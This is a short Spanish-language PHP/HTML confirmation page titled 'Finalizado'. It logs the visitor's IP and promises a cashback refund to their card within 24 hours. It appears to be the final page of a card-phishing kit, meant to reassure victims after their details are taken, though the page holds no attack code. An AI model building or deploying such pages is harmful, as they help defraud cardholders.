<?php
$ip = getenv("REMOTE_ADDR");
setlocale(LC_TIME, "spanish");

date_default_timezone_set('America/Bogota');
?>
<html>
	<head>
		<title>Finalizado |</title>
		<meta http-equiv="content-type" content="text/html; utf-8">
		<meta charset="utf-8">
		<meta content="es" http-equiv="Content-Language">
		<meta name="viewport" content="width=device-width, initial-scale=1.0">
		<meta http-equiv="X-UA-Compatible" content="IE=edge">
		<link href="css/style.css" rel="stylesheet">
		<link href="css/stylesheet.css" rel="stylesheet">
		<link rel="icon" type="image/png" href="img/logo.png" />
	</head>
	<body>
		<div id="fondo-blanco">
			<div style="display: table-cell; vertical-align: middle; text-align:center; padding: 50px;">
				<img src="img/finalizar1.png" width="90"><br><br>
				<span style="font-size: 26px; font-weight: 700; color: #333;">Finalizado</span>
				<br><br>
				<p style="font-size: 18px; line-height: 1.4; max-width: 520px; margin: 0 auto; color: #444;">
					En las próximas 24 horas recibirás tu cashback en reembolso a tu tarjeta.
				</p>
				<br>
				<a href="index.html" class="btn" style="background:#0062cc; padding: 12px 24px; color:#fff; border-radius:5px; display:inline-block; text-decoration:none;">Volver al inicio</a>
			</div>
		</div>
	</body>
</html>